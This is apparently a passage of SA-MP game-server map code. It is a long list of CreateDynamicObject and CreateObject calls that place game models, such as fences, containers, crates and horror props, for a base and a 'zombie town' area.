CreateDynamicObject(8057,-1075.67590332,2381.30078125,136.54769897,0.00000000,90.00000000,89.95007324); //object(hseing01_lvs) (62)
CreateDynamicObject(8057,-1089.29919434,2377.65112305,136.54769897,0.00000000,90.00000000,359.94482422); //object(hseing01_lvs) (63)
CreateDynamicObject(8057,-1020.79211426,2394.06835938,136.54769897,0.00000000,90.00000000,87.95584106); //object(hseing01_lvs) (64)
CreateDynamicObject(6232,-992.62609863,2411.06933594,154.41989136,0.00000000,0.00000000,267.99499512); //object(canal_arch) (1)
CreateDynamicObject(12814,-976.53771973,2411.47045898,137.53512573,0.00000000,0.00000000,269.99450684); //object(cuntyeland04) (64)
CreateDynamicObject(12814,-985.34704590,2446.52563477,129.82504272,0.00000000,0.00000000,87.99499512); //object(cuntyeland04) (65)
CreateDynamicObject(12814,-982.43261719,2520.69921875,127.32510376,0.00000000,0.00000000,87.99499512); //object(cuntyeland04) (66)
CreateDynamicObject(12814,-1026.44995117,2426.08227539,131.38487244,0.00000000,90.00000000,269.98950195); //object(cuntyeland04) (67)
CreateDynamicObject(12814,-935.48199463,2444.39111328,129.82504272,0.00000000,0.00000000,87.99499512); //object(cuntyeland04) (68)
CreateDynamicObject(8057,-978.99468994,2428.49487305,131.19769287,0.00000000,90.00000000,87.95104980); //object(hseing01_lvs) (65)
CreateDynamicObject(8057,-978.99414062,2428.49414062,131.19769287,0.00000000,90.00000000,267.95056152); //object(hseing01_lvs) (66)
CreateDynamicObject(8057,-935.71093750,2458.86547852,131.19769287,0.00000000,90.00000000,269.94488525); //object(hseing01_lvs) (67)
CreateDynamicObject(8057,-927.45501709,2434.84179688,131.19769287,0.00000000,90.00000000,175.93945312); //object(hseing01_lvs) (68)
CreateDynamicObject(12814,-936.82073975,2446.73779297,127.40007782,24.00000000,0.00000000,178.49505615); //object(cuntyeland04) (70)
CreateDynamicObject(12814,-928.85742188,2409.17407227,137.53512573,0.00000000,0.00000000,269.98901367); //object(cuntyeland04) (71)
CreateDynamicObject(8057,-931.40588379,2381.05175781,131.19769287,0.00000000,90.00000000,175.93505859); //object(hseing01_lvs) (70)
CreateDynamicObject(8057,-961.49188232,2353.35668945,131.19769287,0.00000000,90.00000000,87.93505859); //object(hseing01_lvs) (71)
CreateDynamicObject(8057,-976.91387939,2370.37768555,131.19769287,0.00000000,90.00000000,357.93438721); //object(hseing01_lvs) (72)
CreateDynamicObject(14416,-942.51562500,2404.83398438,136.36822510,6.00000000,0.00000000,179.50000000); //object(carter-stairs07) (3)
CreateDynamicObject(8656,-936.24017334,2402.02709961,138.67195129,0.00000000,0.00000000,89.98950195); //object(shbbyhswall09_lvs) (1)
CreateDynamicObject(8656,-952.63183594,2387.34179688,138.67195129,0.00000000,0.00000000,176.98901367); //object(shbbyhswall09_lvs) (1)
CreateDynamicObject(8656,-954.17938232,2358.52734375,138.67195129,0.00000000,0.00000000,176.98425293); //object(shbbyhswall09_lvs) (1)
CreateDynamicObject(12814,-937.95129395,2377.35449219,139.78506470,0.00000000,0.00000000,357.73901367); //object(cuntyeland04) (72)
CreateDynamicObject(12814,-967.97985840,2373.06567383,137.53512573,0.00000000,0.00000000,357.23901367); //object(cuntyeland04) (73)
CreateDynamicObject(12814,-1001.98352051,2452.60058594,133.33285522,0.00000000,90.00000000,359.98950195); //object(cuntyeland04) (74)
CreateDynamicObject(12814,-1007.72363281,2457.16015625,133.33285522,0.00000000,90.00000000,267.98928833); //object(cuntyeland04) (75)
CreateDynamicObject(3095,-1061.27050781,2567.45239258,144.85282898,270.00000000,179.99450684,270.00000000); //object(a51_jetdoor) (7)
CreateDynamicObject(3095,-1061.27050781,2567.45214844,153.72785950,270.00000000,179.99450684,270.00000000); //object(a51_jetdoor) (7)
CreateDynamicObject(3095,-1061.23364258,2576.10278320,153.72785950,270.00000000,179.99450684,270.00000000); //object(a51_jetdoor) (7)
CreateDynamicObject(8057,-1046.84570312,2553.47949219,148.30781555,0.00000000,90.00000000,179.96154785); //object(hseing01_lvs) (74)
CreateDynamicObject(12814,-1050.62695312,2450.58398438,131.38487244,0.00000000,90.00000000,177.98400879); //object(cuntyeland04) (77)
CreateDynamicObject(3095,-1105.61718750,2567.84497070,139.91270447,270.00000000,179.99450684,270.00000000); //object(a51_jetdoor) (7)
CreateDynamicObject(3095,-1105.63671875,2559.76879883,139.91270447,270.00000000,179.99450684,269.50000000); //object(a51_jetdoor) (7)
CreateDynamicObject(3095,-1122.31372070,2544.17919922,139.91270447,270.00000000,179.99450684,269.49462891); //object(a51_jetdoor) (7)
CreateDynamicObject(12814,-1077.83508301,2448.94311523,121.13902283,270.00000000,179.99450684,91.98950195); //object(cuntyeland04) (41)
CreateDynamicObject(12814,-1092.30908203,2434.78515625,120.73904419,270.00000000,180.00000000,357.99395752); //object(cuntyeland04) (41)
CreateDynamicObject(12814,-1046.89221191,2555.36499023,139.16905212,270.00000000,179.99450684,357.98852539); //object(cuntyeland04) (41)
CreateDynamicObject(2991,-1143.17968750,2530.24365234,135.89057922,0.00000000,0.00000000,0.00000000); //object(imy_bbox) (1)
CreateDynamicObject(2991,-1194.26867676,2514.94848633,137.47055054,0.00000000,0.00000000,0.00000000); //object(imy_bbox) (2)
CreateDynamicObject(2991,-1195.01159668,2514.94189453,138.72833252,0.00000000,0.00000000,0.00000000); //object(imy_bbox) (3)
CreateDynamicObject(2991,-1193.18261719,2535.80029297,137.47055054,0.00000000,0.00000000,60.00000000); //object(imy_bbox) (4)
CreateDynamicObject(2991,-1142.30517578,2397.34643555,146.34065247,0.00000000,0.00000000,129.99633789); //object(imy_bbox) (5)
CreateDynamicObject(2932,-1156.86425781,2393.06958008,147.16484070,0.00000000,0.00000000,0.00000000); //object(kmb_container_blue) (1)
CreateDynamicObject(2991,-1154.91271973,2386.68701172,146.34065247,0.00000000,0.00000000,129.99572754); //object(imy_bbox) (7)
CreateDynamicObject(2991,-1161.81762695,2403.18554688,138.34121704,3.70831299,22.04858398,90.49520874); //object(imy_bbox) (8)
CreateDynamicObject(2991,-1073.09326172,2448.29174805,126.64057922,0.00000000,0.00000000,179.99206543); //object(imy_bbox) (9)
CreateDynamicObject(2991,-1161.81738281,2403.18554688,139.59121704,3.70788574,22.04406738,90.49438477); //object(imy_bbox) (10)
CreateDynamicObject(2934,-1006.35699463,2424.43432617,137.73191833,346.00000000,0.00000000,90.00000000); //object(kmb_container_red) (1)
CreateDynamicObject(2935,-966.78405762,2384.72924805,137.54293823,0.00000000,0.00000000,270.00000000); //object(kmb_container_yel) (1)
CreateDynamicObject(2935,-936.89208984,2448.29614258,131.28477478,0.00000000,0.00000000,20.00000000); //object(kmb_container_yel) (2)
CreateDynamicObject(2935,-1001.63378906,2542.10009766,128.78483582,0.00000000,0.00000000,89.99511719); //object(kmb_container_yel) (3)
CreateDynamicObject(2935,-1001.63378906,2542.09960938,131.53483582,0.00000000,0.00000000,89.99450684); //object(kmb_container_yel) (4)
CreateDynamicObject(2935,-1001.63378906,2542.09960938,134.28483582,0.00000000,0.00000000,89.99450684); //object(kmb_container_yel) (5)
CreateDynamicObject(2935,-1001.63378906,2542.09960938,137.28483582,0.00000000,0.00000000,89.99450684); //object(kmb_container_yel) (6)
CreateDynamicObject(2935,-1001.44873047,2538.81762695,128.78483582,0.00000000,0.00000000,89.99450684); //object(kmb_container_yel) (7)
CreateDynamicObject(2935,-1001.44824219,2538.81738281,131.53483582,0.00000000,0.00000000,89.99450684); //object(kmb_container_yel) (8)
CreateDynamicObject(2935,-1001.44824219,2538.81738281,134.28483582,0.00000000,0.00000000,89.99450684); //object(kmb_container_yel) (9)
CreateDynamicObject(2935,-1001.48797607,2535.80810547,128.78483582,0.00000000,0.00000000,89.99450684); //object(kmb_container_yel) (10)
CreateDynamicObject(2935,-1001.48730469,2535.80761719,132.03483582,0.00000000,0.00000000,89.99450684); //object(kmb_container_yel) (11)
CreateDynamicObject(2935,-1001.30224609,2532.52563477,128.78483582,0.00000000,0.00000000,89.99450684); //object(kmb_container_yel) (12)
CreateDynamicObject(18257,-1148.34558105,2397.14501953,145.71292114,0.00000000,0.00000000,270.00000000); //object(crates) (1)
CreateDynamicObject(3576,-1155.52209473,2402.29199219,147.20559692,0.00000000,0.00000000,0.00000000); //object(dockcrates2_la) (1)
CreateDynamicObject(3576,-1161.27990723,2410.91601562,136.75552368,0.00000000,0.00000000,0.00000000); //object(dockcrates2_la) (2)
CreateDynamicObject(3576,-1022.71850586,2480.92944336,127.49170685,0.00000000,0.00000000,0.00000000); //object(dockcrates2_la) (3)
CreateDynamicObject(3576,-978.05487061,2482.21142578,131.31674194,0.00000000,0.00000000,0.00000000); //object(dockcrates2_la) (4)
CreateDynamicObject(3630,-1071.53552246,2400.09838867,127.50547028,0.00000000,0.00000000,0.00000000); //object(crdboxes2_las) (12)
CreateDynamicObject(3630,-1190.66723633,2442.48779297,136.75546265,0.00000000,0.00000000,88.00000000); //object(crdboxes2_las) (13)
CreateDynamicObject(3630,-1198.28942871,2529.23876953,138.33543396,0.00000000,0.00000000,87.99499512); //object(crdboxes2_las) (14)
CreateDynamicObject(3630,-1184.18103027,2559.50000000,129.00546265,0.00000000,0.00000000,357.99499512); //object(crdboxes2_las) (15)
CreateDynamicObject(5259,-943.56158447,2384.61035156,141.29287720,0.00000000,0.00000000,0.00000000); //object(las2dkwar01) (1)
CreateDynamicObject(3630,-1135.86120605,2503.94189453,136.33543396,0.00000000,0.00000000,179.99499512); //object(crdboxes2_las) (16)
CreateDynamicObject(3630,-1145.02905273,2503.85546875,136.13597107,358.00000000,0.00000000,179.99450684); //object(crdboxes2_las) (17)
CreateDynamicObject(12814,-1048.44995117,2459.57202148,145.18479919,0.00000000,90.00000000,177.98400879); //object(cuntyeland04) (77)
CreateDynamicObject(12814,-1046.73620605,2508.72460938,145.18479919,0.00000000,90.00000000,177.98400879); //object(cuntyeland04) (77)
CreateDynamicObject(12814,-1055.81689453,2471.63159180,145.68492126,0.00000000,90.00000000,91.98358154); //object(cuntyeland04) (77)
CreateDynamicObject(12814,-1055.81640625,2471.63085938,145.68492126,0.00000000,90.00000000,271.98278809); //object(cuntyeland04) (77)
CreateDynamicObject(12814,-1061.91857910,2450.57885742,145.68492126,0.00000000,90.00000000,271.97753906); //object(cuntyeland04) (77)
CreateDynamicObject(12814,-1061.91796875,2450.57812500,145.68492126,0.00000000,90.00000000,91.97732544); //object(cuntyeland04) (77)
//zombie town
CreateObject(7371,-352.6815186,2743.9824219,66.5219879,0.0000000,0.0000000,0.0000000); //object(vgsnelec_fence_02) (1)
CreateObject(7371,-352.6806641,2743.9824219,61.7719879,0.0000000,0.0000000,0.0000000); //object(vgsnelec_fence_02) (2)
CreateObject(7371,-352.6806641,2743.9824219,57.7719879,0.0000000,0.0000000,0.0000000); //object(vgsnelec_fence_02) (3)
CreateObject(7371,-352.6806641,2743.9824219,69.7719879,0.0000000,0.0000000,0.0000000); //object(vgsnelec_fence_02) (4)
CreateObject(7371,-352.6806641,2743.9824219,73.5219879,0.0000000,0.0000000,0.0000000); //object(vgsnelec_fence_02) (5)
CreateObject(7371,-352.6806641,2743.9824219,77.5219879,0.0000000,0.0000000,0.0000000); //object(vgsnelec_fence_02) (6)
CreateObject(7371,-352.6806641,2743.9824219,81.2719879,0.0000000,0.0000000,0.0000000); //object(vgsnelec_fence_02) (7)
CreateObject(7371,-352.6806641,2743.9824219,85.2719879,0.0000000,0.0000000,0.0000000); //object(vgsnelec_fence_02) (8)
CreateObject(7371,-352.6806641,2743.9824219,89.0219879,0.0000000,0.0000000,0.0000000); //object(vgsnelec_fence_02) (9)
CreateObject(7371,-352.6806641,2743.9824219,92.5219879,0.0000000,0.0000000,0.0000000); //object(vgsnelec_fence_02) (10)
CreateObject(7371,-353.1708679,2634.5144043,64.8219910,0.0000000,0.0000000,55.8499756); //object(vgsnelec_fence_02) (11)
CreateObject(7371,-353.1699219,2634.5136719,62.3219910,0.0000000,0.0000000,55.8489990); //object(vgsnelec_fence_02) (12)
CreateObject(7371,-353.1699219,2634.5136719,59.8219910,0.0000000,0.0000000,55.8489990); //object(vgsnelec_fence_02) (13)
CreateObject(7371,-353.1699219,2634.5136719,68.8219910,0.0000000,0.0000000,55.8489990); //object(vgsnelec_fence_02) (14)
CreateObject(7371,-353.1699219,2634.5136719,73.3219910,0.0000000,0.0000000,55.8489990); //object(vgsnelec_fence_02) (15)
CreateObject(7371,-353.1699219,2634.5136719,77.0719910,0.0000000,0.0000000,55.8489990); //object(vgsnelec_fence_02) (16)
CreateObject(7371,-353.1699219,2634.5136719,81.3219910,0.0000000,0.0000000,55.8489990); //object(vgsnelec_fence_02) (17)
CreateObject(7371,-353.1699219,2634.5136719,85.5719910,0.0000000,0.0000000,55.8489990); //object(vgsnelec_fence_02) (18)
CreateObject(7371,-353.1699219,2634.5136719,89.3219910,0.0000000,0.0000000,55.8489990); //object(vgsnelec_fence_02) (19)
CreateObject(7371,-271.9223938,2580.0207520,50.0703125,0.0000000,0.0000000,91.7590332); //object(vgsnelec_fence_02) (20)
CreateObject(7371,-271.9218750,2580.0205078,54.0703125,0.0000000,0.0000000,91.7578125); //object(vgsnelec_fence_02) (22)
CreateObject(7371,-271.9218750,2580.0205078,58.0703125,0.0000000,0.0000000,91.7578125); //object(vgsnelec_fence_02) (23)
CreateObject(7371,-271.9218750,2580.0205078,61.3203125,0.0000000,0.0000000,91.7578125); //object(vgsnelec_fence_02) (24)
CreateObject(7371,-271.9218750,2580.0205078,65.3203125,0.0000000,0.0000000,91.7578125); //object(vgsnelec_fence_02) (25)
CreateObject(7371,-271.9218750,2580.0205078,69.3203125,0.0000000,0.0000000,91.7578125); //object(vgsnelec_fence_02) (26)
CreateObject(7371,-271.9218750,2580.0205078,72.8203125,0.0000000,0.0000000,91.7578125); //object(vgsnelec_fence_02) (27)
CreateObject(7371,-271.9218750,2580.0205078,77.3203125,0.0000000,0.0000000,91.7578125); //object(vgsnelec_fence_02) (28)
CreateObject(7371,-271.9218750,2580.0205078,81.0703125,0.0000000,0.0000000,91.7578125); //object(vgsnelec_fence_02) (29)
CreateObject(7371,-271.9218750,2580.0205078,84.8203125,0.0000000,0.0000000,91.7578125); //object(vgsnelec_fence_02) (30)
CreateObject(7371,-271.9218750,2580.0205078,88.8203125,0.0000000,0.0000000,91.7578125); //object(vgsnelec_fence_02) (31)
CreateObject(7371,-197.1123352,2524.5080566,56.8599396,0.0000000,0.0000000,151.5778503); //object(vgsnelec_fence_02) (32)
CreateObject(7371,-196.8188171,2524.1030273,52.6099396,0.0000000,0.0000000,151.5728760); //object(vgsnelec_fence_02) (33)
CreateObject(7371,-196.8183594,2524.1025391,61.3599396,0.0000000,0.0000000,151.5728760); //object(vgsnelec_fence_02) (34)
CreateObject(7371,-196.8183594,2524.1025391,65.1099396,0.0000000,0.0000000,151.5728760); //object(vgsnelec_fence_02) (35)
CreateObject(7371,-196.8183594,2524.1025391,68.8599396,0.0000000,0.0000000,151.5728760); //object(vgsnelec_fence_02) (36)
CreateObject(7371,-196.8183594,2524.1025391,72.8599396,0.0000000,0.0000000,151.5728760); //object(vgsnelec_fence_02) (37)
CreateObject(7371,-196.8183594,2524.1025391,76.3599396,0.0000000,0.0000000,151.5728760); //object(vgsnelec_fence_02) (38)
CreateObject(7371,-196.8183594,2524.1025391,80.3599396,0.0000000,0.0000000,151.5728760); //object(vgsnelec_fence_02) (39)
CreateObject(7371,-196.8183594,2524.1025391,84.6099396,0.0000000,0.0000000,151.5728760); //object(vgsnelec_fence_02) (40)
CreateObject(7371,-196.8183594,2524.1025391,88.1099396,0.0000000,0.0000000,151.5728760); //object(vgsnelec_fence_02) (41)
CreateObject(7371,-196.8183594,2524.1025391,49.1099396,0.0000000,0.0000000,151.5728760); //object(vgsnelec_fence_02) (42)
CreateObject(7371,-196.8183594,2524.1025391,45.6099396,0.0000000,0.0000000,151.5728760); //object(vgsnelec_fence_02) (43)
CreateObject(7371,-196.8183594,2524.1025391,43.3599396,0.0000000,0.0000000,151.5728760); //object(vgsnelec_fence_02) (44)
CreateObject(7371,-140.6879578,2653.6110840,62.8726463,0.0000000,0.0000000,167.4527588); //object(vgsnelec_fence_02) (45)
CreateObject(7371,-140.6875000,2653.6103516,67.3726501,0.0000000,0.0000000,167.4481201); //object(vgsnelec_fence_02) (46)
CreateObject(7371,-140.6875000,2653.6103516,70.8726501,0.0000000,0.0000000,167.4481201); //object(vgsnelec_fence_02) (47)
CreateObject(7371,-140.6875000,2653.6103516,74.6226501,0.0000000,0.0000000,167.4481201); //object(vgsnelec_fence_02) (48)
CreateObject(7371,-140.6875000,2653.6103516,78.6226501,0.0000000,0.0000000,167.4481201); //object(vgsnelec_fence_02) (49)
CreateObject(7371,-140.6875000,2653.6103516,82.3726501,0.0000000,0.0000000,167.4481201); //object(vgsnelec_fence_02) (50)
CreateObject(7371,-140.6875000,2653.6103516,86.8726501,0.0000000,0.0000000,167.4481201); //object(vgsnelec_fence_02) (51)
CreateObject(7371,-140.6875000,2653.6103516,90.6226501,0.0000000,0.0000000,167.4481201); //object(vgsnelec_fence_02) (52)
CreateObject(7371,-138.0373993,2664.8161621,65.6226501,0.0000000,0.0000000,167.4481201); //object(vgsnelec_fence_02) (53)
CreateObject(7371,-138.0371094,2664.8154297,70.1226501,0.0000000,0.0000000,167.4481201); //object(vgsnelec_fence_02) (54)
CreateObject(7371,-138.0371094,2664.8154297,74.3726501,0.0000000,0.0000000,167.4481201); //object(vgsnelec_fence_02) (55)
CreateObject(7371,-138.0371094,2664.8154297,78.1226501,0.0000000,0.0000000,167.4481201); //object(vgsnelec_fence_02) (56)
CreateObject(7371,-138.0371094,2664.8154297,82.1226501,0.0000000,0.0000000,167.4481201); //object(vgsnelec_fence_02) (57)
CreateObject(7371,-127.0239334,2767.0822754,68.7318344,1.9849854,0.0000000,235.2982178); //object(vgsnelec_fence_02) (58)
CreateObject(7371,-138.0371094,2664.8154297,79.6226501,1.9830322,0.0000000,167.4426270); //object(vgsnelec_fence_02) (59)
CreateObject(7371,-291.5611572,2808.0581055,61.3882027,0.0000000,0.0000000,107.6281128); //object(vgsnelec_fence_02) (60)
CreateObject(7371,-291.5605469,2808.0576172,66.1381989,0.0000000,0.0000000,107.6275635); //object(vgsnelec_fence_02) (61)
CreateObject(7371,-291.5605469,2808.0576172,70.1381989,0.0000000,0.0000000,107.6275635); //object(vgsnelec_fence_02) (62)
CreateObject(7371,-291.5605469,2808.0576172,73.8881989,0.0000000,0.0000000,107.6275635); //object(vgsnelec_fence_02) (63)
CreateObject(7371,-291.5605469,2808.0576172,77.6381989,0.0000000,0.0000000,107.6275635); //object(vgsnelec_fence_02) (64)
CreateObject(7371,-291.5605469,2808.0576172,81.3881989,0.0000000,0.0000000,107.6275635); //object(vgsnelec_fence_02) (65)
CreateObject(7371,-291.5605469,2808.0576172,85.1381989,0.0000000,0.0000000,107.6275635); //object(vgsnelec_fence_02) (66)
CreateObject(7371,-291.5605469,2808.0576172,88.3881989,0.0000000,0.0000000,107.6275635); //object(vgsnelec_fence_02) (67)
CreateObject(3749,-140.5724792,2636.6848145,68.6357956,0.0000000,0.0000000,85.7149658); //object(clubgate01_lax) (1)
CreateObject(853,-240.5575409,2602.4343262,62.1037979,0.0000000,0.0000000,0.0000000); //object(cj_urb_rub_5) (1)
CreateObject(853,-250.1540527,2587.3034668,62.9709854,0.0000000,0.0000000,0.0000000); //object(cj_urb_rub_5) (2)
CreateObject(853,-282.1059265,2610.9782715,62.2588272,0.0000000,0.0000000,0.0000000); //object(cj_urb_rub_5) (3)
CreateObject(852,-274.1139526,2610.0180664,61.8581543,0.0000000,0.0000000,0.0000000); //object(cj_urb_rub_4) (1)
CreateObject(852,-281.6027832,2588.9821777,62.5703125,0.0000000,0.0000000,0.0000000); //object(cj_urb_rub_4) (2)
CreateObject(852,-224.0797882,2593.2177734,61.7031250,0.0000000,0.0000000,0.0000000); //object(cj_urb_rub_4) (3)
CreateObject(3302,-235.3548584,2598.2636719,61.7868767,0.0000000,0.0000000,0.0000000); //object(cxrf_corpanel) (1)
CreateObject(3302,-247.5866241,2583.9455566,62.6540642,0.0000000,0.0000000,0.0000000); //object(cxrf_corpanel) (2)
CreateObject(3302,-249.1288757,2599.6447754,61.9419060,0.0000000,0.0000000,0.0000000); //object(cxrf_corpanel) (3)
CreateObject(3302,-265.0798340,2609.8403320,61.9419060,0.0000000,0.0000000,0.0000000); //object(cxrf_corpanel) (4)
CreateObject(3302,-283.4651489,2602.5832520,61.9419060,0.0000000,0.0000000,0.0000000); //object(cxrf_corpanel) (5)
CreateObject(3092,-280.4324036,2609.1303711,61.8224602,278.6149902,0.0000000,0.0000000); //object(dead_tied_cop) (1)
CreateObject(3073,-269.4214783,2608.1689453,62.7704735,0.0000000,0.0000000,0.0000000); //object(kmb_container_broke) (1)
CreateObject(2907,-278.1625061,2589.8144531,62.7303467,0.0000000,0.0000000,0.0000000); //object(kmb_deadtorso) (1)
CreateObject(2907,-270.6647644,2589.9411621,62.7303467,0.0000000,0.0000000,0.0000000); //object(kmb_deadtorso) (2)
CreateObject(2907,-276.4622498,2586.4899902,62.7303467,0.0000000,0.0000000,0.0000000); //object(kmb_deadtorso) (3)
CreateObject(2907,-263.6034851,2589.7028809,62.7303467,0.0000000,0.0000000,0.0000000); //object(kmb_deadtorso) (4)
CreateObject(2907,-256.2381592,2585.0073242,62.7303467,0.0000000,0.0000000,0.0000000); //object(kmb_deadtorso) (5)
CreateObject(2907,-266.2621155,2583.8627930,62.7303467,0.0000000,0.0000000,0.0000000); //object(kmb_deadtorso) (6)
CreateObject(2907,-261.3637390,2587.3627930,62.7303467,0.0000000,0.0000000,0.0000000); //object(kmb_deadtorso) (7)
CreateObject(2908,-271.2773132,2587.3474121,62.6477318,0.0000000,0.0000000,0.0000000); //object(kmb_deadhead) (1)
CreateObject(2908,-263.7069702,2587.4223633,62.6477318,0.0000000,0.0000000,0.0000000); //object(kmb_deadhead) (2)
CreateObject(2908,-262.7014771,2582.4497070,62.6477318,0.0000000,0.0000000,0.0000000); //object(kmb_deadhead) (3)
CreateObject(2908,-258.4671936,2589.2358398,62.6477318,0.0000000,0.0000000,0.0000000); //object(kmb_deadhead) (4)
CreateObject(2908,-272.3339233,2589.9599609,62.6477318,0.0000000,0.0000000,0.0000000); //object(kmb_deadhead) (5)
CreateObject(2908,-268.3990479,2590.5507812,62.6477318,0.0000000,0.0000000,0.0000000); //object(kmb_deadhead) (6)
CreateObject(2908,-272.1690063,2584.1618652,62.6477318,0.0000000,0.0000000,0.0000000); //object(kmb_deadhead) (7)
CreateObject(2908,-277.5511169,2586.3288574,62.6477318,0.0000000,0.0000000,0.0000000); //object(kmb_deadhead) (8)
CreateObject(2908,-275.7085876,2588.3947754,62.6477318,0.0000000,0.0000000,0.0000000); //object(kmb_deadhead) (9)
CreateObject(2908,-280.4290771,2590.1679688,62.6477318,0.0000000,0.0000000,0.0000000); //object(kmb_deadhead) (10)
CreateObject(2906,-278.9434509,2587.7634277,62.6443253,0.0000000,0.0000000,0.0000000); //object(kmb_deadarm) (1)
CreateObject(2906,-275.5868530,2590.7392578,62.6443253,0.0000000,0.0000000,0.0000000); //object(kmb_deadarm) (2)
CreateObject(2906,-274.9243164,2587.9873047,62.6443253,0.0000000,0.0000000,0.0000000); //object(kmb_deadarm) (3)
CreateObject(2906,-270.7088623,2586.2778320,62.6443253,0.0000000,0.0000000,0.0000000); //object(kmb_deadarm) (4)
CreateObject(2906,-267.1838379,2589.9746094,62.6443253,0.0000000,0.0000000,0.0000000); //object(kmb_deadarm) (5)
CreateObject(2906,-263.7566528,2584.0393066,62.6443253,0.0000000,0.0000000,0.0000000); //object(kmb_deadarm) (6)
CreateObject(2906,-259.7414246,2586.6909180,62.6443253,0.0000000,0.0000000,0.0000000); //object(kmb_deadarm) (7)
CreateObject(2905,-267.3870850,2588.2531738,62.6617622,0.0000000,0.0000000,0.0000000); //object(kmb_deadleg) (1)
CreateObject(2905,-259.1107788,2590.1281738,62.6617622,0.0000000,0.0000000,0.0000000); //object(kmb_deadleg) (2)
CreateObject(2905,-268.2501831,2585.4077148,62.6617622,0.0000000,0.0000000,0.0000000); //object(kmb_deadleg) (3)
CreateObject(2905,-262.7966614,2586.0737305,62.6617622,0.0000000,0.0000000,0.0000000); //object(kmb_deadleg) (4)
CreateObject(2905,-269.8126221,2587.1337891,62.6617622,0.0000000,0.0000000,0.0000000); //object(kmb_deadleg) (5)
CreateObject(2905,-277.8696594,2585.4328613,62.6617622,0.0000000,0.0000000,0.0000000); //object(kmb_deadleg) (6)
CreateObject(2905,-277.3700867,2587.9655762,62.6617622,0.0000000,0.0000000,0.0000000); //object(kmb_deadleg) (7)
CreateObject(2905,-279.8733826,2589.2770996,62.6617622,0.0000000,0.0000000,0.0000000); //object(kmb_deadleg) (8)
CreateObject(2890,-240.7893982,2595.7519531,61.7031250,0.0000000,0.0000000,0.0000000); //object(kmb_skip) (1)
CreateObject(1462,-252.3203735,2594.6699219,61.8581543,0.0000000,0.0000000,83.7299805); //object(dyn_woodpile) (1)
CreateObject(1442,-266.8970032,2586.9238281,63.1687965,0.0000000,0.0000000,0.0000000); //object(dyn_firebin0) (1)
CreateObject(1431,-244.3132019,2592.8027344,62.2507401,0.0000000,0.0000000,0.0000000); //object(dyn_box_pile) (1)
CreateObject(1369,-244.1313934,2590.3996582,62.4084473,0.0000000,0.0000000,0.0000000); //object(cj_wheelchair1) (1)
CreateObject(12957,-234.7038422,2598.8054199,62.7547874,0.0000000,0.0000000,0.0000000); //object(sw_pickupwreck01) (1)
CreateObject(942,-252.1203156,2608.8127441,64.3013840,0.0000000,0.0000000,0.0000000); //object(cj_df_unit_2) (1)
CreateObject(2670,-256.5883484,2610.5000000,61.9502068,0.0000000,0.0000000,0.0000000); //object(proc_rubbish_1) (1)
CreateObject(2671,-250.7408447,2611.2504883,61.8581543,0.0000000,0.0000000,0.0000000); //object(proc_rubbish_3) (1)
CreateObject(2672,-253.9195557,2611.9704590,62.1376152,0.0000000,0.0000000,0.0000000); //object(proc_rubbish_4) (1)
CreateObject(2673,-247.4015961,2611.1835938,61.9459839,0.0000000,0.0000000,0.0000000); //object(proc_rubbish_5) (1)
CreateObject(2674,-258.6866760,2611.1450195,61.8798943,0.0000000,0.0000000,0.0000000); //object(proc_rubbish_2) (1)
CreateObject(2676,-246.3795624,2609.7829590,61.9614792,0.0000000,0.0000000,0.0000000); //object(proc_rubbish_8) (1)
CreateObject(960,-259.5358276,2608.4575195,62.2399445,0.0000000,0.0000000,0.0000000); //object(cj_arm_crate) (1)
CreateObject(6964,-253.7425842,2604.3474121,61.1081543,0.0000000,0.0000000,0.0000000); //object(venefountwat02) (1)
CreateObject(987,-141.3580780,2634.5004883,73.3339920,0.0000000,0.0000000,93.7000427); //object(elecfence_bar) (1)
CreateObject(987,-141.3574219,2634.5000000,78.0839920,0.0000000,0.0000000,93.6968994); //object(elecfence_bar) (2)
CreateObject(987,-141.3574219,2634.5000000,81.8339920,0.0000000,0.0000000,93.6968994); //object(elecfence_bar) (3)
CreateObject(987,-141.3574219,2634.5000000,86.3339920,0.0000000,0.0000000,93.6968994); //object(elecfence_bar) (4)
CreateObject(987,-140.8333740,2625.0529785,73.3339920,0.0000000,0.0000000,93.6968994); //object(elecfence_bar) (5)
CreateObject(987,-140.8330078,2625.0527344,77.3339920,0.0000000,0.0000000,93.6968994); //object(elecfence_bar) (6)
CreateObject(987,-140.8330078,2625.0527344,81.8339920,0.0000000,0.0000000,93.6968994); //object(elecfence_bar) (7)
CreateObject(987,-140.8330078,2625.0527344,85.0839920,0.0000000,0.0000000,93.6968994); //object(elecfence_bar) (8)
CreateObject(987,-140.8330078,2625.0527344,89.0839920,0.0000000,0.0000000,93.6968994); //object(elecfence_bar) (9)
CreateObject(987,-141.3574219,2634.5000000,90.0839920,0.0000000,0.0000000,93.6968994); //object(elecfence_bar) (10)
CreateObject(7371,-138.0371094,2664.8154297,89.8726501,1.9830322,0.0000000,167.4426270); //object(vgsnelec_fence_02) (74)
CreateObject(7371,-127.0234375,2767.0820312,72.9818344,1.9830322,0.0000000,235.2941895); //object(vgsnelec_fence_02) (75)
CreateObject(7371,-127.0234375,2767.0820312,77.7318344,1.9830322,0.0000000,235.2941895); //object(vgsnelec_fence_02) (76)
CreateObject(7371,-127.0234375,2767.0820312,81.2318344,1.9830322,0.0000000,235.2941895); //object(vgsnelec_fence_02) (77)
CreateObject(7371,-127.0234375,2767.0820312,85.2318344,1.9830322,0.0000000,235.2941895); //object(vgsnelec_fence_02) (78)
CreateObject(7371,-127.0234375,2767.0820312,88.7318344,1.9830322,0.0000000,235.2941895); //object(vgsnelec_fence_02) (79)
CreateObject(7371,-127.0234375,2767.0820312,92.4818344,1.9830322,0.0000000,235.2941895); //object(vgsnelec_fence_02) (80)
CreateObject(5299,-220.7503052,2662.1367188,59.6015625,0.0000000,0.0000000,0.0000000); //object(las2_brigtower) (1)
CreateObject(3940,-172.8341522,2666.4768066,65.1194687,0.0000000,0.0000000,179.4599609); //object(comms01) (1)
CreateObject(3939,-173.0386047,2684.1508789,63.4482918,0.0000000,0.0000000,183.4299316); //object(hanger01) (1)
CreateObject(16613,-333.0265503,2634.9016113,59.3013611,0.0000000,0.0000000,0.0000000); //object(des_bigtelescope) (1)
CreateObject(16006,-236.8182983,2768.7424316,61.3983040,0.0000000,0.0000000,0.0000000); //object(ros_townhall) (1)
CreateObject(1595,-244.0738220,2767.2165527,75.0111923,0.0000000,0.0000000,0.0000000); //object(satdishbig) (1)
CreateObject(967,-144.4848633,2646.0407715,63.2732468,0.0000000,0.0000000,170.5704956); //object(bar_gatebox01) (1)
